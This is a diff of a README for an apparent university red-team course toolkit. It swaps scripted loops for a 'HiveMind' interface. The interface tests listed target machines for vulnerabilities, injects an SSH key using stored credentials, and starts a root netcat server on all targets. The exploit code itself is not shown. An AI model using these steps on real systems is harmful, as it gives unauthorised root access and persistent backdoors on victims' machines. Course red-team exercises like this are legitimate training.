@@ -7,48 +7,36 @@ I originally took this course in 2019 and was assigned to Red Team because of so
 
 ---
 
-## Test if all users are vulnerable:
-```
-from TargetMachine import TargetMachine
-exec(open("main.py").read())
-config = read_config_file()
-public_ssh_key_to_inject = config["public_ssh_key_to_inject"]
-ips = config["ips"]
-credentials = config["credentials"]
-users = []
-for ip in ips:
-	new_user = TargetMachine(ip_address=ip, credentials=credentials, public_ssh_key_to_inject=public_ssh_key_to_inject)
-	users.append(new_user)
+## Using HiveMind:
 
-for user in users:
-	for exploit in user.exploits:
-		try:
-			exploit.test_if_vulnerable()
-		except Exception:
-			pass
+### Starting a Python shell:
+```
+cd ~/SDSU_Cyber_Security_Red_Team
+python3
+```
+
+### Instantiating Hivemind (in the Python shell):
+```
+from HiveMind import HiveMind
+hivemind = HiveMind()
+hivemind.add_new_target_machines_from_config()
+hivemind.add_new_target_machines_from_ip_list()
 
 ```
 
-## Start a root netcat server on all target machines:
+### Update the list of target machines:
 ```
-from TargetMachine import TargetMachine
-exec(open("main.py").read())
-config = read_config_file()
-public_ssh_key_to_inject = config["public_ssh_key_to_inject"]
-ips = config["ips"]
-credentials = config["credentials"]
-users = []
-for ip in ips:
-	new_user = TargetMachine(ip_address=ip, credentials=credentials, public_ssh_key_to_inject=public_ssh_key_to_inject)
-	users.append(new_user)
+hivemind.add_new_target_machines_from_ip_list()
+```
 
-for user in users:
-	for exploit in user.exploits:
-		try:
-			exploit.start_root_netcat_server()
-		except Exception:
-			pass
+### Testing all machines for vulnerabilities:
+```
+hivemind.test_all_machines_for_vulnerabilities()
+```
 
+### Starting a root netcat server on all target machines:
+```
+hivemind.start_root_netcat_server_on_all_machines()
 ```
 
 ---
